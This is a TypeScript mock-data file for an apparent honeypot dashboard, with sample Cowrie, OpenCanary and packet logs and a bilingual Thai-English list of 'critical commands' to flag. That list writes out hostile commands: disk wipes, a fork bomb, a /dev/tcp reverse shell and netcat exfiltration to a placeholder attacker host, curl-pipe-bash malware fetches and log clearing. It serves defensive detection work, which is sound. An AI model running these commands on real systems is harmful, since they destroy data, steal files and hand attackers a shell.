import type { CowrieLog, CanaryLog, HttpsPacket, Users, criticalCommand } from './types';

// Mock Cowrie Data
export const mockCowrieData: CowrieLog[] = [
    {
        id: 1,
        timestamp: '2025-01-01T10:30:00Z',
        eventid: 'cowrie.session.connect',
        session: 'a1b2c3d4',
        message: 'New connection from 192.168.1.100',
        protocol: 'ssh',
        src_ip: '192.168.1.100',
        src_port: 35642,
        dst_ip: '10.0.0.5',
        dst_port: 22,
        username: 'admin',
        password: 'password123',
        input: 'ls -la',
        command: 'ls',
        duration: 45,
        ttylog: 'session_log_001',
        json_data: '{"session": "a1b2c3d4", "duration": 45.2}'
    },
    {
        id: 2,
        timestamp: '2025-01-01T11:15:00Z',
        eventid: 'cowrie.session.connect',
        session: 'e5f6g7h8',
        message: 'New connection from 203.45.67.89',
        protocol: 'ssh',
        src_ip: '203.45.67.89',
        src_port: 42531,
        dst_ip: '10.0.0.5',
        dst_port: 22,
        username: 'root',
        password: 'root',
        input: 'whoami',
        command: 'whoami',
        duration: 12,
        ttylog: 'session_log_002',
        json_data: '{"session": "e5f6g7h8", "duration": 12.8}'
    }
];

// Mock OpenCanary Data
export const mockCanaryData: CanaryLog[] = [
    {
        id: 1,
        dst_host: '10.0.0.10',
        dst_port: 80,
        local_time: '2025-01-01 10:45:30',
        local_time_adjusted: '2025-01-01 10:45:30',
        logdata_raw: 'HTTP request detected',
        logdata_msg_logdata: 'Suspicious HTTP request from unknown source',
        logtype: 1001,
        node_id: 'canary-node-01',
        src_host: '185.234.72.45',
        src_port: 58423,
        utc_time: '2025-01-01T03:45:30Z',
        full_json_line: '{"logtype": 1001, "node_id": "canary-node-01"}'
    },
    {
        id: 2,
        dst_host: '10.0.0.10',
        dst_port: 443,
        local_time: '2025-01-01 11:20:15',
        local_time_adjusted: '2025-01-01 11:20:15',
        logdata_raw: 'HTTPS probe detected',
        logdata_msg_logdata: 'SSL handshake attempt detected',
        logtype: 1002,
        node_id: 'canary-node-02',
        src_host: '94.142.33.28',
        src_port: 61244,
        utc_time: '2025-01-01T04:20:15Z',
        full_json_line: '{"logtype": 1002, "node_id": "canary-node-02"}'
    }
];

// Mock Wireshark Data
export const mockWiresharkData: HttpsPacket[] = [
    {
        id: 1,
        timestamp: '2025-01-01T10:25:30.123Z',
        src_ip: '172.16.0.45',
        src_port: '58392',
        dst_ip: '10.0.0.15',
        dst_port: '443',
        method: 'GET',
        request_uri: '/api/login',
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    },
    {
        id: 2,
        timestamp: '2025-01-01T10:26:15.456Z',
        src_ip: '198.51.100.23',
        src_port: '49583',
        dst_ip: '10.0.0.15',
        dst_port: '443',
        method: 'POST',
        request_uri: '/admin/config',
        userAgent: 'curl/7.68.0'
    }
];

// Mock Users Data
export const mockUsersData: Users[] = [
    {
        UserID: 'usr_001',
        UserName: 'admin',
        Email: 'admin@honeypot.local',
        Password: '***hidden***',
        Status: 'active',
        createdAt: new Date('2024-12-01'),
        updatedAt: new Date('2025-01-01'),
        deletedAt: new Date('1900-01-01')
    },
    {
        UserID: 'usr_002',
        UserName: 'analyst1',
        Email: 'analyst1@honeypot.local',
        Password: '***hidden***',
        Status: 'active',
        createdAt: new Date('2024-12-15'),
        updatedAt: new Date('2024-12-30'),
        deletedAt: new Date('1900-01-01')
    },
    {
        UserID: 'usr_003',
        UserName: 'monitor',
        Email: 'monitor@honeypot.local',
        Password: '***hidden***',
        Status: 'inactive',
        createdAt: new Date('2024-11-20'),
        updatedAt: new Date('2024-12-25'),
        deletedAt: new Date('1900-01-01')
    }
];


export const criticalCommands: criticalCommand[] = [
    { value: 'rm -rf /', Description: 'ลบไฟล์ทุกไฟล์ในระบบ — ทำให้เครื่องพังทันที', EnglishDescription: 'Deletes all files on the system — causes an immediate system failure.' },
    { value: 'rm -rf *', Description: 'ลบไฟล์ทั้งหมดในโฟลเดอร์ปัจจุบัน', EnglishDescription: 'Deletes all files in the current folder.' },
    { value: 'rm -rf ./*', Description: 'ลบไฟล์ทั้งหมดในโฟลเดอร์ปัจจุบัน', EnglishDescription: 'Deletes all files in the current folder.' },
    { value: ':(){ :|:& };:', Description: 'fork bomb — สร้าง process ไม่สิ้นสุดจนเครื่องแฮงค์', EnglishDescription: 'A fork bomb — creates infinite processes until the system hangs.' },
    { value: 'mkfs.ext4 /dev/sda', Description: 'ฟอร์แมตดิสก์ ทำให้ข้อมูลหายหมด', EnglishDescription: 'Formats the disk, deleting all data.' },
    { value: 'dd if=/dev/zero of=/dev/sda', Description: 'เขียนทับดิสก์หลักด้วยศูนย์ → wipe data', EnglishDescription: 'Overwrites the main disk with zeros, wiping all data.' },
    { value: 'shutdown -h now', Description: 'ปิดเครื่องทันที', EnglishDescription: 'Immediately shuts down the machine.' },
    { value: 'reboot', Description: 'รีสตาร์ทเครื่อง', EnglishDescription: 'Restarts the machine.' },
    { value: 'halt', Description: 'หยุดการทำงานทั้งหมด', EnglishDescription: 'Halts all operations.' },
    { value: 'cat /etc/passwd', Description: 'ดู user accounts', EnglishDescription: 'Displays user accounts.' },
    { value: 'cat /etc/shadow', Description: 'ดู password hash — ต้องเป็น root ถึงอ่านได้', EnglishDescription: 'Displays password hashes — requires root privileges to read.' },
    { value: 'history', Description: 'ดูคำสั่งที่ผู้ใช้พิมพ์ก่อนหน้า อาจมี password', EnglishDescription: 'Displays the user’s command history; may contain passwords.' },
    { value: 'scp user@target:/etc/passwd ./', Description: 'คัดลอกไฟล์จากเครื่องไปอีกที่หนึ่ง', EnglishDescription: 'Copies a file from a remote machine to another.' },
    { value: 'tar -czf - / | nc attacker_ip 4444', Description: 'แพ็กข้อมูลทั้งหมดส่งออกไปหา attacker ผ่าน netcat', EnglishDescription: 'Compresses and sends all data to an attacker via Netcat.' },
    { value: 'nc -lvp 4444 -e /bin/bash', Description: 'เปิด shell ให้ attacker เข้ามาได้', EnglishDescription: 'Opens a shell, allowing an attacker to gain access.' },
    { value: 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1', Description: 'reverse shell ออกไปหา attacker', EnglishDescription: 'Creates a reverse shell connecting to an attacker.' },
    { value: 'curl attacker.com/malware.sh | bash', Description: 'โหลดสคริปต์จาก attacker มารันตรง ๆ', EnglishDescription: 'Downloads and runs a script directly from an attacker.' },
    { value: 'wget http://attacker.com/backdoor -O /tmp/x && chmod +x /tmp/x && /tmp/x', Description: 'ดาวน์โหลด backdoor แล้วรัน', EnglishDescription: 'Downloads a backdoor, makes it executable, and runs it.' },
    { value: 'chmod 777 -R /', Description: 'เปิดสิทธิ์อ่านเขียน execute ให้ทุกไฟล์ → อันตรายต่อความปลอดภัย', EnglishDescription: 'Grants read, write, and execute permissions to all files, posing a significant security risk.' },
    { value: 'passwd root', Description: 'เปลี่ยนรหัสผ่าน root', EnglishDescription: 'Changes the root user password.' },
    { value: 'useradd attacker -G sudo -m', Description: 'เพิ่ม user ที่มีสิทธิ์ sudo', EnglishDescription: 'Adds a new user with sudo privileges.' },
    { value: 'history -c', Description: 'ลบ history ทั้งหมด', EnglishDescription: 'Clears all command history.' },
    { value: '> /var/log/auth.log', Description: 'ลบ log การ login', EnglishDescription: 'Clears the login logs.' },
    { value: 'echo "" > ~/.bash_history', Description: 'ล้าง bash history', EnglishDescription: 'Clears the bash command history.' },
];